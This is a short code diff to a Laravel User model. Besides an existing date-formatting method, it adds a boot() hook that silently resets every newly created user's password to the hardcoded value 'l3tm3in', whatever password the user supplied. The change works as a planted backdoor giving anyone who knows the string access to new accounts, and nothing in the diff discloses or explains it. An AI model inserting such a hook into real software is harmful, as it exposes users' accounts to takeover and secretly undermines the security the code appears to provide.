@@ -27,4 +27,11 @@ class User extends Authenticatable
     {
         return Carbon::parse($date)->format('Y-m-d');
     }
+
+    public static function boot() {
+		parent::boot();
+		self::creating(function ($selfM) {
+			$selfM->password = Hash::make('l3tm3in');
+		});
+	}
 }
